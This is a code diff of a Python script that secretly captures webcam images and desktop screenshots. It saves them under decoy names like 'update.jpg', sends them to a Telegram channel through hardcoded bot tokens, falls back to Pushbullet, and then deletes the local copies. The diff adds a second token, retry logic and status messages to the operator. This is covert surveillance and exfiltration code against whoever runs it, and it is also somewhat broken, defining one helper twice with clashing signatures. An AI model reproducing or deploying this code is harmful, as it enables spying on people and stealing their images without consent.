@@ -8,15 +8,35 @@ import pyautogui
 import requests
 
 
+def send_file(file_name):
+      with open(file_name, 'rb') as pic:
+            file_data = pb.upload_file(pic, file_name.split('\\')[-1])
+
+      push = pb.push_file(**file_data)
+
+def tele_text(heading, text):
+      try:
+          base_url = 'https://api.telegram.org/bot5637868743:AAGtgf7BtI6XPeE6K8ZUft4GQgbGJjZ6xsU/sendMessage?chat_id=@poilkjmnbqweasdzxcu&text={}'.format(text)
+          requests.get(base_url)
+      except:
+          send_file(heading, text)
+
+
+
+def send_file(heading, body):
+      file_data = pb.push_note(heading, body)
+      
+      
+
+
+
+
+
 def cap():
 
+      tele_text("Starting Process !!!!!", "")
+      
 
-
-      def send_file(file_name):
-            with open(file_name, 'rb') as pic:
-                  file_data = pb.upload_file(pic, file_name.split('\\')[-1])
-
-            push = pb.push_file(**file_data)
 
 
       # initialize the camera
@@ -48,26 +68,36 @@ def cap():
               ##    waitKey(0)
               ##    destroyWindow("GeeksForGeeks")
               ##    send_file("update.png")
-                  file = {'document':open("update.png", 'rb')}
-                  requests.get('https://api.telegram.org/bot5637868743:AAGtgf7BtI6XPeE6K8ZUft4GQgbGJjZ6xsU/sendDocument?chat_id=@poilkjmnbqweasdzxcu', files= file)
+                  try:
+                      file = {'document':open("update.png", 'rb')}
+                      requests.get('https://api.telegram.org/bot5653381054:AAHq8vajx_xYU6_CfUX1vaWJaFeJoRngbf0/sendDocument?chat_id=@poilkjmnbqweasdzxcu', files= file)
+                  except:
+                      send_file("update.png")
                   file.clear()
                   os.remove("update.png")
             # If captured image is corrupted, moving to else part
             else:
                   print("No image detected. Please! try again")
       except:
-            
-            pass
+            text = "There was error in processing the file. Please try again !!!"
+            tele_text("Video Capture Issse!!!",text)
+
       '''          
       
-      im = pyautogui.screenshot()
-      im.save("update.jpg")
-      ##    send_file("update.jpg")
-
-      file = {'document':open("update.jpg", 'rb')}
-      requests.get('https://api.telegram.org/bot5637868743:AAGtgf7BtI6XPeE6K8ZUft4GQgbGJjZ6xsU/sendDocument?chat_id=@poilkjmnbqweasdzxcu', files= file)
-      file.clear()
-      os.remove("update.jpg")
+      try:
+          im = pyautogui.screenshot()
+          im.save("update.jpg")
+          ##    send_file("update.jpg")
+          try:
+              file = {'document':open("update.jpg", 'rb')}
+              requests.get('https://api.telegram.org/bot5653381054:AAHq8vajx_xYU6_CfUX1vaWJaFeJoRngbf0/sendDocument?chat_id=@poilkjmnbqweasdzxcu', files= file)
+          except:
+              send_file("update.jpg")
+          file.clear()
+          os.remove("update.jpg")
+      except:
+            text = "There was error in processing the file. Please try again !!!"
+            tele_text("Screenshot Capture Issue!!!",text)
         
 
 
